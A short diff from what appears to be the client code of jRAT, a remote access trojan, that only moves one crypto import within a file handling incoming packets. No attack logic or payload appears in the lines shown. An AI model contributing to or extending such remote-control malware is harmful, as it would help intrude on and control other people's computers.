@@ -1,10 +1,10 @@
 package jrat.client.packets.incoming;
 
-import jrat.common.crypto.Crypto;
 import jrat.client.Connection;
 import jrat.client.Main;
 import jrat.client.packets.outgoing.Packet65ErrorLog;
 import jrat.client.utils.Utils;
+import jrat.common.crypto.Crypto;
 
 import java.io.FileInputStream;
 
